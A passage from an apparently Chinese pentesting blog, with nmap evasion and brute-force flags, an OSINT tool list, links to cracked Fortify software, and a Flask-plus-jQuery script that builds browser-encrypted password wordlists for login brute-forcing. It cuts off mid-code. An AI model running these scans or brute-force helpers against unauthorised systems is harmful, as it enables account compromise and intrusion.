<p><a href="https://www.freebuf.com/articles/web/216939.html">应急响应实例分享 - FreeBuf网络安全行业门户</a></p>
<h2 id="网络探针"><a href="#网络探针" class="headerlink" title="网络探针"></a>网络探针</h2><p>什么是网络探针？网络探针是接入控制的有效手段！网络探针就是一个被赋予了特殊功能的BTA桌面安全助理程序，它能够检测到在特定的网络区间内（一般为内网的同一C类网段）没有安装和运行BTA桌面安全助理程序的其它计算机，并采取技术措施自动限制或阻断这些计算机的网络通信。这些操作是由网络探针自动完成的，不需要管理人员的手工操作，也不需要对相关网络设备的配置进行修改。</p>
<p>人会说谎，流量不会 </p>
<p><a href="https://blog.csdn.net/Aubergine_kang/article/details/83905614#:~:text=%E7%BD%91%E7%BB%9C%E6%8E%A2%E9%92%88%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA,%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E3%80%82">https://blog.csdn.net/Aubergine_kang/article/details/83905614#:~:text=%E7%BD%91%E7%BB%9C%E6%8E%A2%E9%92%88%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA,%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E3%80%82</a></p>
<h2 id="红队-信息收集进阶"><a href="#红队-信息收集进阶" class="headerlink" title="红队-信息收集进阶"></a>红队-信息收集进阶</h2><p>ATT&amp;CK：<a href="https://blog.csdn.net/weixin_43965597/article/details/125926620%EF%BC%88%E6%B2%A1%E4%BB%94%E7%BB%86%E7%A0%94%E7%A9%B6%E8%BF%99%E4%B8%AA%EF%BC%8C%E4%BB%A5%E5%90%8E%E9%9C%80%E8%A6%81%E5%86%8D%E7%9C%8B%EF%BC%89">https://blog.csdn.net/weixin_43965597/article/details/125926620（没仔细研究这个，以后需要再看）</a></p>
<h3 id="OSINT简介"><a href="#OSINT简介" class="headerlink" title="OSINT简介"></a>OSINT简介</h3><p>开源网络情报(Open source intelligence),简称OSINT,是美国中央情报局(CIA)的一种情报搜集手段，从各种公开的信息资源中寻找和获取有价值的情报OSINT特点：因为开源、宽泛；各类情报&#x2F;信息都可收集</p>
<p>之后看酷学院补充</p>
<h3 id="端口扫描-nmap-amp-masscan"><a href="#端口扫描-nmap-amp-masscan" class="headerlink" title="端口扫描-nmap&amp;masscan"></a>端口扫描-nmap&amp;masscan</h3><p>url链接：https:&#x2F;nmap.org&#x2F;<br>Nmap可以扫ip可以扫域名，<br>-V显示扫描过程；<br>-A进攻式扫描；<br>-p1-65535,全端：<br>O探测操作系统：<br>-nP不用ping；<br>-Pn&#x3D;-P0不进行主机发现直接扫描：<br>-top-ports100排名前100端口；<br>-iL filename从文件中读取目标进行扫描：<br><strong>扫描方式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sT TCP扫描（稳定，相较于SYN次选），三次握手；</span><br><span class="line">-sS用SYN扫描（速度快、隐蔽），半开放式扫描，无完整握手；</span><br><span class="line">-sU用UDP扫描（扫描慢）；</span><br><span class="line">-sA用ACK扫描；</span><br><span class="line">-sX用Xmas扫描；</span><br><span class="line">-sF用FIN扫描（可绕过一些防火墙）；</span><br><span class="line">-sP用ping,确认主机是否在线；</span><br><span class="line">-sV扫描主机和端口的版本</span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-script部分漏洞利用</span><br><span class="line">-script all使用所有脚本进行扫描</span><br><span class="line">-script auth自动识别</span><br><span class="line">-script vuln对常见漏洞扫描</span><br><span class="line">--script smb-brute对用户名密码进行爆破</span><br></pre></td></tr></table></figure>

<p><strong>绕防火墙：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-DRND:10(随机产生10个虚拟ip对目标进行扫描)</span><br><span class="line">-f发送很小的包（类似mtu)</span><br><span class="line">-mtu8(8、16、24、32等8的倍数)</span><br><span class="line">-S源地址伪装</span><br><span class="line">-source-port53用53端口对目标进行扫描</span><br><span class="line">-data-length20发送指定长度的包去探测</span><br><span class="line">-sI agent-ip以agent-ip的身份去扫描（默认80端口）</span><br></pre></td></tr></table></figure>

<h4 id="subfinder"><a href="#subfinder" class="headerlink" title="subfinder"></a>subfinder</h4><p>url链接：https:&#x2F;github.com&#x2F;projectdiscovery&#x2F;subfinder<br>功能：通过调用各个api接口进行子域名收集（调用包括Sublist3r、crtsh、fofa、spyses等等）</p>
<p>（没用过，以后有机会试试，一般我用layer</p>
<h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p>url链接：https:&#x2F;github.com&#x2F;shmilylty.&#x2F;OneForAll<br>功能：通过DNS、搜索引擎、爬子域等方式进行检索</p>
<h4 id="Sublist3r-amp-子域名挖掘机"><a href="#Sublist3r-amp-子域名挖掘机" class="headerlink" title="Sublist3r&amp;子域名挖掘机"></a>Sublist3r&amp;子域名挖掘机</h4><p>url链接：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a>  功能：通过搜索引擎爬取，多了一个检查端口</p>
<p>url链接：<a href="https://www.webshell.cc/6384.htm">https://www.webshell.cc/6384.htm</a>  功能：输入直接查询子域名（爆破枚举</p>
<h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p>内容安全策略(CSP):开发者明确告诉客户端（制定比较严格的策略和规侧）<br>内容安全策略(CSP)定义了Content-Security-Policy HTTP头，它允许我们创建可信内容源的白名单，并指示浏览器只执行或呈现来自这些源的资源<br>我们可以查看HTTP的Content-Security-Policy:字段来搜集子域名信息。</p>
<h4 id="whois-x2F-DNS查询-centralops"><a href="#whois-x2F-DNS查询-centralops" class="headerlink" title="whois&#x2F;DNS查询-centralops"></a>whois&#x2F;DNS查询-centralops</h4><p>url链接：<a href="https://centralops.net/co/DomainDossier.aspx">https://centralops.net/co/DomainDossier.aspx</a></p>
<h4 id="whois-x2F-DNS查询-dnsdumpster"><a href="#whois-x2F-DNS查询-dnsdumpster" class="headerlink" title="whois&#x2F;DNS查询-dnsdumpster"></a>whois&#x2F;DNS查询-dnsdumpster</h4><p>url链接：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>功能：查询DNS解析记录，其中里面包含其他接口（如：查询共享DNS主机、共享IP主机、端口探测等端口)，但是会招出查询次数</p>
<h4 id="ip反查域名-rapiddns"><a href="#ip反查域名-rapiddns" class="headerlink" title="ip反查域名-rapiddns"></a>ip反查域名-rapiddns</h4><p>url链接：<a href="https://rapiddns.io/">https://rapiddns.io/</a><br>功能：查询ip归属地、网络中心，反查网站、旁站C段查询</p>
<h4 id="ip反查域名-IP138"><a href="#ip反查域名-IP138" class="headerlink" title="ip反查域名-IP138"></a>ip反查域名-IP138</h4><p>url链接：<a href="https://www.ip138.com/iplookup.asp">https://www.ip138.com/iplookup.asp</a><br>功能：查询同IP下都有哪些web站点</p>
<h4 id="CDN-chinaz"><a href="#CDN-chinaz" class="headerlink" title="CDN-chinaz"></a>CDN-chinaz</h4><p>url链接：<a href="https://cdn.chinaz.com/">https://cdn.chinaz.com/</a><br>功能：查询是否有CDN及CDN提供商名字</p>
<h4 id="数字证书-censys-amp-crt-sh"><a href="#数字证书-censys-amp-crt-sh" class="headerlink" title="数字证书-censys&amp;crt.sh"></a>数字证书-censys&amp;crt.sh</h4><p>url链接：<a href="https://search.censys.io/">https://search.censys.io/</a><br>选择证书查询即可，可查询自签名，过期证书、未过期证书、发行人，以及邮箱</p>
<p>url链接：<a href="https://crt.sh/">https://crt.sh/</a><br>属于域名即可查询</p>
<h4 id="搜索引擎-google-amp-fofa"><a href="#搜索引擎-google-amp-fofa" class="headerlink" title="搜索引擎-google&amp;fofa"></a>搜索引擎-google&amp;fofa</h4><h4 id="搜索引擎-x2F-网络空间测绘-shodan-amp-CenSys-amp-DNSdb-amp-Spyse"><a href="#搜索引擎-x2F-网络空间测绘-shodan-amp-CenSys-amp-DNSdb-amp-Spyse" class="headerlink" title="搜索引擎&#x2F;网络空间测绘-shodan&amp;CenSys&amp;DNSdb&amp;Spyse"></a>搜索引擎&#x2F;网络空间测绘-shodan&amp;CenSys&amp;DNSdb&amp;Spyse</h4><h4 id="社交媒体-rocketreach"><a href="#社交媒体-rocketreach" class="headerlink" title="社交媒体-rocketreach"></a>社交媒体-rocketreach</h4><p>url链接：<a href="https://rocketreach.co/">https://rocketreach.co/</a><br>使用twitter、.googlel账号登陆即可查询</p>
<p>通过ip查社交媒体</p>
<h4 id="邮件信息收集-hunter-amp-phonebook-amp-infoga"><a href="#邮件信息收集-hunter-amp-phonebook-amp-infoga" class="headerlink" title="邮件信息收集-hunter&amp;phonebook&amp;infoga"></a>邮件信息收集-hunter&amp;phonebook&amp;infoga</h4><p>url链接：<a href="https://hunter.io/">https://hunter.io/</a><br>输入需要查询的邮件后缀，即可查看部分，然后再点击来源即可看到详情</p>
<p>url链接：<a href="https://phonebook.cz/">https://phonebook.cz/</a>  （效果很好）<br>输入需要查询的邮件后缀，即可查询邮件名（网站中有其他功能但是都不太好用），该网站的数据是从<a href="https://intelx.io/%E4%B8%AD%E6%89%BE%E7%9A%84%E6%95%B0%E6%8D%AE">https://intelx.io/中找的数据</a></p>
<p>url链接：<a href="https://github.com/m4IIok/infoga">https://github.com/m4IIok/infoga</a><br>功能：从不同公共来源（搜索引擎、pgp密钥服务器和shodan)收集电子邮件帐户信息(IP、主机名、国家&#x2F;地区…)的工具，并使用haveibeenpned.com API检查电子邮件是否泄露</p>
<h4 id="临时邮件-fakemailgenerator-amp-kuku"><a href="#临时邮件-fakemailgenerator-amp-kuku" class="headerlink" title="临时邮件-fakemailgenerator&amp;kuku"></a>临时邮件-fakemailgenerator&amp;kuku</h4><p>url链接：<a href="http://www.fakemailgenerator.com/">http://www.fakemailgenerator.com/</a><br>功能：生成假造身份后可获得一个邮件地址，该邮件地址可以收邮件内容</p>
<p>url链接：<a href="https://m.kuku.lu/">https://m.kuku.lu/</a><br>直接使用，可以首发邮件且无需注册</p>
<h4 id="商业记录-天眼查-x2F-爱企查-x2F-企查查"><a href="#商业记录-天眼查-x2F-爱企查-x2F-企查查" class="headerlink" title="商业记录-天眼查&#x2F;爱企查&#x2F;企查查"></a>商业记录-天眼查&#x2F;爱企查&#x2F;企查查</h4><p>url链接：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>url链接：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a><br>url链接：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>股权穿透、子母公司、相关产品和地址、备案信息查询等信息</p>
<h4 id="IP定位-ipuu"><a href="#IP定位-ipuu" class="headerlink" title="IP定位-ipuu"></a>IP定位-ipuu</h4><p>url链接：<a href="https://www.ipuu.net/">https://www.ipuu.net</a><br>高精度定位P所在区域，需要登陆后查询（高精度查询每日有查询上限）</p>
<h4 id="综合信息收集-xray"><a href="#综合信息收集-xray" class="headerlink" title="综合信息收集-xray"></a>综合信息收集-xray</h4><p>详细使用文档：<a href="https://docs.xray.cool/#/">https://docs.xray.cool/#/</a></p>
<h4 id="综合信息收集-Maltego"><a href="#综合信息收集-Maltego" class="headerlink" title="综合信息收集-Maltego"></a>综合信息收集-Maltego</h4><p>url链接：<a href="https://www.maltego.com/">https://www.maltego.com/</a><br>在官网可以直接下载，Mac、Windows、Linux版本(kali自带)<br>在官网注册一个账号即可直接使用（分收费版、免费版）<br>鼠标右键即可出来<br>可以查dns解析、子域名、邮箱关联等信息</p>
<h4 id="代码信息泄露-github-amp-searchcode"><a href="#代码信息泄露-github-amp-searchcode" class="headerlink" title="代码信息泄露-github&amp;searchcode"></a>代码信息泄露-github&amp;searchcode</h4><p><a href="https://searchcode.com/">https://searchcode.com/</a></p>
<h4 id="密码信息泄漏-intelx"><a href="#密码信息泄漏-intelx" class="headerlink" title="密码信息泄漏-intelx"></a>密码信息泄漏-intelx</h4><p>url链接：<a href="https://intelx.io/">https://intelx.io/</a><br>随便注册一个账号即可查询</p>
<h4 id="交通信息收集-火车地铁"><a href="#交通信息收集-火车地铁" class="headerlink" title="交通信息收集-火车地铁"></a>交通信息收集-火车地铁</h4><p>url链接：<a href="https://www.openrailwaymap.org/">https://www.openrailwaymap.org/</a><br>查线路情况，高速段落、专用线段落</p>
<h4 id="交通信息收集-飞机"><a href="#交通信息收集-飞机" class="headerlink" title="交通信息收集-飞机"></a>交通信息收集-飞机</h4><p>url链接：<br>航旅纵横app<br><a href="https://www.flightradar24.com/">https://www.flightradar24.com/</a><br>直接章询即可，包括每一趟航天高度、时速、现在位置</p>
<h2 id="web测试-业务逻辑漏洞"><a href="#web测试-业务逻辑漏洞" class="headerlink" title="web测试-业务逻辑漏洞"></a>web测试-业务逻辑漏洞</h2><p><a href="https://blog.csdn.net/weixin_48421613/article/details/121008379">常见的业务逻辑漏洞-整合篇_vlan911的博客-CSDN博客</a></p>
<p><a href="https://www.freebuf.com/vuls/281141.html">逻辑漏洞梳理与总结 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/m0_57751431/article/details/119333788">业务逻辑漏洞总结_Andy数宇的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_48421613/article/details/121008379">https://blog.csdn.net/weixin_48421613/article/details/121008379</a></p>
<h2 id="APP测试"><a href="#APP测试" class="headerlink" title="APP测试"></a>APP测试</h2><h3 id="安卓客户端测试流程"><a href="#安卓客户端测试流程" class="headerlink" title="安卓客户端测试流程"></a>安卓客户端测试流程</h3><p>客户端静态安全<br>客户端数据安全<br>客户端运行时安全<br>安全策略<br>通信安全</p>
<h3 id="IOS客户端测试流程"><a href="#IOS客户端测试流程" class="headerlink" title="IOS客户端测试流程"></a>IOS客户端测试流程</h3><p>客户端安全<br>网络通信安全<br>安全策略检测<br>可选测试项</p>
<h3 id="Drozer使用"><a href="#Drozer使用" class="headerlink" title="Drozer使用"></a>Drozer使用</h3><h3 id="安卓脱壳入门"><a href="#安卓脱壳入门" class="headerlink" title="安卓脱壳入门"></a>安卓脱壳入门</h3><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h3><p><a href="https://www.ddosi.org/fortify/">Fortify SCA 20.2.2 cracked Fortify破解版 - 🔰雨苁ℒ🔰 (ddosi.org)</a></p>
<p><a href="https://cn-sec.com/archives/1496150.html">fortify_sca_22.2-Windows-linux破解版 | CN-SEC 中文网</a></p>
<p><a href="https://blog.csdn.net/qq_40597962/article/details/118490818">Fortify介绍及使用教程_fortify 使用方法_「已注销」的博客-CSDN博客</a></p>
<p>[第37篇：fortify代码审计工具的使用技巧(1)-审计java代码过程 - 腾讯云开发者社区-腾讯云 (tencent.com)](<a href="https://cloud.tencent.com/developer/article/2225044#:~:text=Fortify%E9%BB%98%E8%AE%A4%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8D%E6%98%AFUTF-8%EF%BC%8C%E5%AF%BC%E8%87%B4%E9%83%A8%E5%88%86%E4%B8%AD%E6%96%87%E7%9A%84Java%E4%BB%A3%E7%A0%81%E4%BC%9A%E5%87%BA%E7%8E%B0%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E3%80%82">https://cloud.tencent.com/developer/article/2225044#:~:text=Fortify默认的编码不是UTF-8，导致部分中文的Java代码会出现乱码问题。</a> 如果是单文件乱码，可以使用 Edit 选项卡下的,Set Encoding 进行设置， 鼠标光标在右侧代码框内点击一下，否则此项功能不能用 ，但是这种方法只适用于单个文件的乱码解决。)</p>
<p><a href="https://www.cnblogs.com/happylumei/p/16731407.html">【安全测试】【fortify】fortify设置中文语言 - 码上起舞 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>安全服务</tag>
      </tags>
  </entry>
  <entry>
    <title>前端key加密处理</title>
    <url>/2023/03/31/%E5%89%8D%E7%AB%AFkey%E5%8A%A0%E5%AF%86%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<p>z</p>
<p>在做渗透测试的时候，很多时候我们想爆破，但是前端加密的情况。</p>
<p>我们可能会想到，把前端加密的代码一个一个弄到本地，然后在本地nodejs环境跑，但是有的时候，弄到最后会发现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eferenceError: window is not defined</span><br><span class="line">    at e:\code\nodejs\webcrack\index.js:1270:9</span><br><span class="line">    at Object.&lt;anonymous&gt; (e:\code\nodejs\webcrack\index.js:2773:2)</span><br><span class="line">    at Module._compile (node:internal/modules/cjs/loader:1101:14)</span><br><span class="line">    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1153:10)</span><br><span class="line">    at Module.load (node:internal/modules/cjs/loader:981:32)</span><br><span class="line">    at Function.Module._load (node:internal/modules/cjs/loader:822:12)</span><br><span class="line">    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)</span><br><span class="line">    at node:internal/main/run_main_module:17:47</span><br></pre></td></tr></table></figure>

<p>本地搭建一个flask服务，代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, filename</span>):</span><br><span class="line">        self.password = []</span><br><span class="line">        self.passwordDict = &#123;&#125;</span><br><span class="line">        self.passwordLength = <span class="number">0</span></span><br><span class="line">        self.curIndex=<span class="number">0</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                <span class="keyword">if</span> line:</span><br><span class="line">                    self.password.append(line.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                    self.passwordLength += <span class="number">1</span></span><br><span class="line">                    self.passwordDict[line] = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, outputfilename</span>):</span><br><span class="line">        outfile1 = <span class="built_in">open</span>(outputfilename + <span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        outfile2 = <span class="built_in">open</span>(outputfilename + <span class="string">&quot;2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> self.passwordDict.items():</span><br><span class="line">            outfile1.write(key + <span class="string">&quot;   &quot;</span> + value + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            outfile2.write(value + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getCurPassword</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.curIndex&lt;self.passwordLength:</span><br><span class="line">            self.curIndex+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> self.password[self.curIndex-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">mypassword = MyPassword(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mypassword.password)</span><br><span class="line"><span class="built_in">print</span>(mypassword.passwordLength)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getCurpasswd&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_curpasswd</span>():</span><br><span class="line">    curPass=mypassword.getCurPassword()</span><br><span class="line">    <span class="built_in">print</span>(curPass)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;password&quot;</span>: curPass&#125;)</span><br><span class="line">    <span class="comment"># 这里可以添加实际的逻辑以获取当前密码</span></span><br><span class="line">    <span class="comment"># a = request.args.get(&#x27;a&#x27;, None)</span></span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">    <span class="comment"># if a is not None:</span></span><br><span class="line">    <span class="comment">#     return &#123;&quot;a&quot;: a&#125;</span></span><br><span class="line">    <span class="comment">#     # return jsonify(&#123;&quot;a&quot;: a&#125;)</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="comment">#     return jsonify(&#123;&quot;error&quot;: &quot;Parameter &#x27;a&#x27; is missing&quot;&#125;), 400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getEncodePass&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encode_pass</span>():</span><br><span class="line">    password=request.args.get(<span class="string">&quot;password&quot;</span>,<span class="literal">None</span>)</span><br><span class="line">    encodePassword=request.args.get(<span class="string">&quot;encodePass&quot;</span>,<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> password <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> encodePassword <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;Parameter &#x27;password&#x27; &#x27;encodePass&#x27;is missing&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mypassword.passwordDict[password]=encodePassword</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;200&quot;</span>&#125;)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/write&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_res</span>():</span><br><span class="line">    mypassword.write(<span class="string">&quot;res&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;200&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getLength&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;code&quot;</span>:mypassword.passwordLength&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>,debug=<span class="literal">True</span>,port=<span class="number">443</span>, ssl_context=(<span class="string">&#x27;cert.pem&#x27;</span>, <span class="string">&#x27;key.pem&#x27;</span>))</span><br><span class="line">    <span class="comment"># app.run(host=&#x27;127.0.0.1&#x27;, debug=True, port=443, ssl_context=&#x27;adhoc&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myres = &#123;&#125;;</span><br><span class="line">myres[<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;null&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> mylength = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">myfunc</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;http://127.0.0.1:443/getLength&quot;</span>, <span class="comment">// 请求的URL</span></span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>, <span class="comment">// 请求方法，可以是 &#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27; 等</span></span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>, <span class="comment">// 预期服务器返回的数据类型</span></span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">      <span class="comment">// 请求成功时的回调函数</span></span><br><span class="line">      mylength = response[<span class="string">&quot;code&quot;</span>];</span><br><span class="line">      <span class="comment">//  console.log(myres[&quot;password&quot;]);</span></span><br><span class="line">      <span class="comment">// 这里可以处理响应数据，例如更新DOM元素</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">jqXHR, textStatus, errorThrown</span>) &#123;</span><br><span class="line">      <span class="comment">// 请求失败时的回调函数</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error: &quot;</span> + textStatus + <span class="string">&quot; - &quot;</span> + errorThrown);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; mylength; i++) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&quot;http://127.0.0.1:443/getCurpasswd&quot;</span>, <span class="comment">// 请求的URL</span></span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>, <span class="comment">// 请求方法，可以是 &#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27; 等</span></span><br><span class="line">      <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>, <span class="comment">// 预期服务器返回的数据类型</span></span><br><span class="line">      <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">        <span class="comment">// 请求成功时的回调函数</span></span><br><span class="line">        myres = response;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(myres[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">        <span class="comment">// 这里可以处理响应数据，例如更新DOM元素</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">jqXHR, textStatus, errorThrown</span>) &#123;</span><br><span class="line">        <span class="comment">// 请求失败时的回调函数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error: &quot;</span> + textStatus + <span class="string">&quot; - &quot;</span> + errorThrown);</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> encodePassword = encrypt.<span class="title function_">encrypt</span>(myres[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>:</span><br><span class="line">        <span class="string">&quot;http://127.0.0.1:443/getEncodePass?password=&quot;</span> +</span><br><span class="line">        myres[<span class="string">&quot;password&quot;</span>] +</span><br><span class="line">        <span class="string">&quot;&amp;encodePass=&quot;</span> +</span><br><span class="line">        encodePassword, <span class="comment">// 请求的URL</span></span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>, <span class="comment">// 请求方法，可以是 &#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27; 等</span></span><br><span class="line">      <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>, <span class="comment">// 预期服务器返回的数据类型</span></span><br><span class="line">      <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">        <span class="comment">// 请求成功时的回调函数</span></span><br><span class="line">        <span class="comment">// 这里可以处理响应数据，例如更新DOM元素</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">jqXHR, textStatus, errorThrown</span>) &#123;</span><br><span class="line">        <span class="comment">// 请求失败时的回调函数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error: &quot;</span> + textStatus + <span class="string">&quot; - &quot;</span> + errorThrown);</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;http://127.0.0.1:443/write&quot;</span>, <span class="comment">// 请求的URL</span></span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>, <span class="comment">// 请求方法，可以是 &#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27; 等</span></span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>, <span class="comment">// 预期服务器返回的数据类型</span></span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">      <span class="comment">// 请求成功时的回调函数</span></span><br><span class="line">      <span class="comment">// 这里可以处理响应数据，例如更新DOM元素</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">jqXHR, textStatus, errorThrown</span>) &#123;</span><br><span class="line">      <span class="comment">// 请求失败时的回调函数</span></span><br><span class="line">      <span class="variable 